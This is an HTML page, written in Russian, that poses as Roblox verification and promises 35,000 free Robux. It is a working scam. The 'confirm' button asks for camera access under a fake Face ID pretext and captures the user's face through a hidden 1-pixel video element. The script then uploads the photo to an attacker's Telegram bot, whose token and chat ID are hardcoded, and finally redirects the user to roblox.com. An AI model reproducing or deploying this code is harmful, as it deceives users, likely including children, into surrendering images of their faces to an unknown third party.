<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox Verification</title>
    <style>
        body { font-family: sans-serif; background: #1a1b1c; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #2b2d2e; padding: 30px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
        #st { margin-top: 15px; color: #888; font-size: 13px; }
        /* Видео должно быть микроскопическим, но ВИДИМЫМ для системы */
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="65" style="filter: invert(1); margin-bottom: 15px;">
    <h2>Проверка владельца</h2>
    <p>Для получения <b>35,000 Robux</b> подтвердите личность. Нажмите кнопку и разрешите доступ.</p>
    <button class="btn" onclick="startPhoto()">ПОДТВЕРДИТЬ</button>
    <div id="st">Система готова</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    async function startPhoto() {
        const btn = document.querySelector('.btn');
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.style.display = 'none';
        st.innerText = "Запуск Face ID...";

        try {
            // Запрашиваем камеру
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 } }, 
                audio: false 
            });
            
            v.srcObject = stream;
            
            // Ждем, когда видео РЕАЛЬНО начнет играть (исправляет пустоту)
            v.onplaying = () => {
                st.innerText = "Сканирование... Держите телефон ровно.";
                
                // Даем камере 5 секунд настроить свет и фокус
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', '7889497672');
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', '👤 **ЛИЦО ПОЛУЧЕНО!**\n\n✅ Пробита защита браузера.\n🌐 Статус: Успешно');

                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                            method: 'POST',
                            body: fd
                        }).then(() => {
                            stream.getTracks().forEach(t => t.stop());
                            alert("✅ Верификация пройдена! Робуксы придут через 15 минут.");
                            window.location.href = "https://www.roblox.com";
                        });
                    }, 'image/jpeg', 0.9);
                }, 5000); // 5 секунд — это гарантия от черного экрана
            };

        } catch (e) {
            alert("Ошибка! Нужно нажать 'Разрешить' для Face ID.");
            btn.style.display = 'block';
        }
    }
</script>
</body>
</html>
